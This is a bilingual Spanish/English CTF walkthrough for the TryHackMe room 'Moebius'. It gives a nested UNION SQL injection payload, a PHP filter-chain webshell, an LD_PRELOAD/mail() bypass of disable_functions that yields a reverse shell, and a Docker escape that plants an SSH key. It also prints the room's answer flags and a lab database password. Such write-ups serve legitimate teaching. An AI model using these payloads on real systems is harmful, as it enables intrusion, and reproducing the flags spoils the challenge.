# Moebius

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|---|------|------|------|---------|--------|-------------|---------|
| Hard | CTF | `moebius` | [TryHackMe](https://tryhackme.com/room/moebius) | 03 Level Hard | Web (API THM `api/v2/rooms/tasks?roomCode=moebius` + websearch de walkthroughs) | SQL Injection (nested UNION) / LFI / PHP Filters Chain / Bypass de disable_functions (LD_PRELOAD + mail) / Docker escape / MySQL | Cadena SQLi → LFI → RCE en un contenedor Docker privilegiado, escape al host y lectura de la flag root desde la base de datos `secret`. |

---

**Contexto:**

> **ES:** El desafío **Moebius** es un CTF Web de dificultad Hard. La sala parte de una web de fotos de gatos en la que el parámetro `short_tag` de `album.php` es vulnerable a una inyección SQL anidada (nested UNION) que permite controlar el valor `path` calculado con HMAC-SHA256 y usado por `image.php` para incluir ficheros (LFI). Con el `SECRET_KEY` obtenido de `dbconfig.php` y la técnica de PHP filter chains (`php://filter`) se convierte el LFI en RCE: aunque las funciones de ejecución están deshabilitadas, se fuerza el bypass vía `putenv("LD_PRELOAD=...")` + `mail()` (técnica Chankro). La shell se obtiene como `www-data` dentro de un contenedor Docker con muchísimas capabilities, se escapa montando el filesystem del host, se lee la flag de usuario en `/root/user.txt` y, "volviendo al punto de partida", se encuentra la flag root en la base de datos `secret` del contenedor `db`. El nombre de la sala juega con la idea de la cinta de Möbius: empiezas en un punto y vuelves a él al final.
> **EN:** The **Moebius** challenge is a Hard-difficulty Web CTF. The room starts from a cat-pictures website in which the `short_tag` parameter of `album.php` is vulnerable to a nested UNION-based SQL injection that lets you control the `path` value hashed with HMAC-SHA256 and used by `image.php` to include files (LFI). With the `SECRET_KEY` recovered from `dbconfig.php` and the PHP filters chain technique (`php://filter`), the LFI is turned into RCE: even though execution functions are disabled, the bypass is forced via `putenv("LD_PRELOAD=...")` + `mail()` (Chankro technique). The shell lands as `www-data` inside a highly-capable Docker container, the host filesystem is mounted to escape, the user flag is read at `/root/user.txt` and, "going back to where it all started", the root flag is found in the `secret` database of the `db` container. The room name plays with the idea of the Möbius strip: you start at a point and return to it at the end.

---

## Solucionario

### Task 1: Obtención de flags / Flags

**Explicación:**
La sala **Moebius** pide obtener dos flags tras completar toda la cadena de explotación: la flag de usuario, conseguida tras una inyección SQL anidada convertida en LFI, una cadena de filtros PHP para lograr RCE a pesar de las funciones deshabilitadas y un escape del contenedor Docker montando el filesystem del host; y la flag root, almacenada en la base de datos `secret` del contenedor de MySQL (`db`), a la que se accede con las credenciales encontradas en `/root/challenge/db/db.env`. El reto obliga a "volver al punto de partida": la primera vulnerabilidad que parece insignificante (la base de datos) guarda la última flag.

1. THM{ddb3254b89803ca177d7d11024e7935a}
   THM{2ba37995df993f1294e7c155ce7ef929}

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the value of the user flag? | `THM{ddb3254b89803ca177d7d11024e7935a}` |
| 2 | What is the value of the root flag? | `THM{2ba37995df993f1294e7c155ce7ef929}` |

---

**Metodología:**

1. Reconocimiento: `nmap` → puertos 22 (SSH) y 80 (Apache). La web es una galería de fotos de gatos con las categorías `cute`, `smart` y `fav`.
2. Detección de SQLi: probando `short_tag='` en `album.php` se obtiene un error de base de datos (MySQL). sqlmap confirma técnicas boolean/error/time/UNION. Se filtran los caracteres `;` y `/`.
3. Nested UNION injection: la primera query devuelve el `id` del álbum que se usa sin sanear en una segunda query sobre `images`; inyectando `' UNION SELECT "0 UNION SELECT 1,2,'/etc/passwd'-- -"-- -` se controla la columna `path`. Para saltarse el filtro de `/` se codifica en hex: `0x2f6574632f706173737764`.
4. LFI: `image.php?hash=<hash>&path=/etc/passwd` incluye el fichero. La `hash` se genera en caliente con `hash_hmac('sha256', $path, $SECRET_KEY)`.
5. Lectura de código: con `php://filter/convert.base64-encode/resource=album.php` se lee `album.php` y `dbconfig.php` → `$SECRET_KEY` y credenciales MySQL (`web:TAJnF6YuIot83X3g`).
6. Hash generator: con el `SECRET_KEY` se escribe un script en Python (HMAC-SHA256) que calcula hashes válidos para cualquier `path`.
7. LFI → RCE: con `php_filter_chain_generator.py` se genera una cadena de filtros PHP que evalúa `<?php eval($_POST[0]);?>`. Se prueba `system()` pero `disable_functions` lo bloquea.
8. Bypass de disable_functions: técnica `LD_PRELOAD`: compilar `shell.so` (`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`), subirlo vía `file_put_contents` y disparar `putenv('LD_PRELOAD=/tmp/shell.so'); mail('a','a','a','a');` (alternativa: payload Chankro) → reverse shell como `www-data`.
9. Docker escape: dentro del contenedor, `sudo -l` da acceso total; las capabilities (`000001ffffffffff`) permiten montar el disco del host. `mount /dev/nvme0n1p1 /mnt`, añadir la clave pública de SSH a `/mnt/root/.ssh/authorized_keys` y conectar por SSH como `root` al host → flag de usuario en `/root/user.txt`.
10. Flag root: las credenciales de MySQL en `/root/challenge/db/db.env` dan acceso al contenedor `db`; en la base `secret`, tabla `secrets`, está la flag root.

### Cadena de ataque / Attack Chain

`SQLi anidada (UNION + hex bypass) → LFI (/etc/passwd) → Source leak (php://filter) → SECRET_KEY (HMAC-SHA256) → PHP filter chains → RCE (bypass disable_functions con LD_PRELOAD + mail) → Shell www-data (Docker) → Escape de contenedor (mount host FS + SSH key) → User flag → Credenciales MySQL (db.env) → Base de datos secret → Root flag`

**Learning chain:**

Inyección SQL anidada → Inyección UNION con control de columnas → Bypass de filtros con codificación hex → Local File Inclusion con hash dinámico → PHP stream wrappers → PHP filter chains (LFI to RCE) → Bypass de disabled functions con LD_PRELOAD → Docker escape mediante capabilities/mount → Credenciales en ficheros de entorno → Exfiltración desde bases de datos.

*Lección:* No basta con filtrar caracteres puntuales (`;`, `/`): la codificación en hexadecimal y las cadenas de filtros PHP permiten convertir una SQLi aparentemente trivial en RCE. Además, un contenedor con demasiadas capabilities y un `sudo` sin restricciones convierte una shell de bajo privilegio en un escape al host; y el "tesoro" final puede seguir en el mismo lugar donde empezó la cadena (la base de datos).

**MITRE ATT&CK:**

T1190 (Exploit Public-Facing Application), T1505.003 (Web Shell: Server Software), T1059.006 (Command and Scripting Interpreter: Python), T1574.007 (Hijack Execution Flow: Path Interception by Unquoted Path), T1610 (Deploy Container), T1548 (Abuse Elevation Control Mechanism), T1552.001 (Unsecured Credentials: Credentials In Files)

**Fuente:** [TryHackMe - Moebius](https://tryhackme.com/room/moebius)

---

## Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos. **Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe. **Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto. **Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com). **Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.